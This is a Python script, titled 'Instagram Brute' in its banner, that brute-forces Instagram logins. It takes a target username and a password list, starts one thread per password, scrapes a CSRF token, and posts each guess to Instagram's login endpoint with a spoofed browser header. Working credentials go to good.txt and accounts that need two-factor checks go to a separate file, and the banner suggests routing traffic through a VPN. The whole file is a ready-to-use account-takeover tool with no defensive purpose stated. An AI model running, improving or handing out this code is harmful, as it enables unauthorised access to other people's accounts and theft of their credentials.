from __future__ import absolute_import
from __future__ import print_function
import requests
import sys
import threading
import time
import os
import re
from datetime import datetime
from six.moves import input
from script.script import clear

CheckVersion = str(sys.version)
from random import randint

print('Executing...')
time.sleep(3)
clear()


print('''    
\033[32m
┌┐ ┬─┐┬ ┬┌┬┐  ┌─┐┌─┐┬─┐┌─┐┌─┐   V1.0
├┴┐├┬┘│ │ │   ├┤ │ │├┬┘│  ├┤   
└─┘┴└─└─┘ ┴   └  └─┘┴└─└─┘└─┘     
\033[35m********** \033[38mInstagram Brute \033[35m**********
| \033[31mDeveloper - \033[35mDisease              \033[35m|
| \033[31mGithub - \033[35mCPScript                \033[35m|
| \033[31mPassList - \033[35mAttack.txt            \033[35m|
\033[35m************************************''')

print('''\033[31mNotice -> Brute forcing speeds will 
depend on your VPN's bit rate!!!\033[32m.''')

class InstaBrute(object):
    def __init__(self):
        try:
            user = input('username : ')
            Combo = input('passList : ')
            print('\n----------------------------')

        except KeyboardInterrupt:
            print('Script Stopped!')
            sys.exit()

        with open(Combo, 'r') as x:
            Combolist = x.read().splitlines()
        self.Coutprox = 0
        self.threads = []
        for combo in Combolist:
            password = combo.split(':')[0]
            t = threading.Thread(target=self.New_Br, args=(user, password))
            t.start()
            self.threads.append(t)
            time.sleep(0.01)  # Adjust this sleep time according to your system's capability

        for j in self.threads:
            j.join()

    def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def New_Br(self, user, pwd):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        timestamp = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.get(link)
            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf
            })
            print(f'{user}:{pwd}\n----------------------------')

            if 'authenticated": true' in r.text:
                print(('' + user + ':' + pwd + ' --> Good hack '))
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')
            elif 'two_factor_required' in r.text:
                print(('' + user + ':' + pwd + ' -->  Good It has to be checked '))
                with open('results_NeedVerify.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')


InstaBrute()
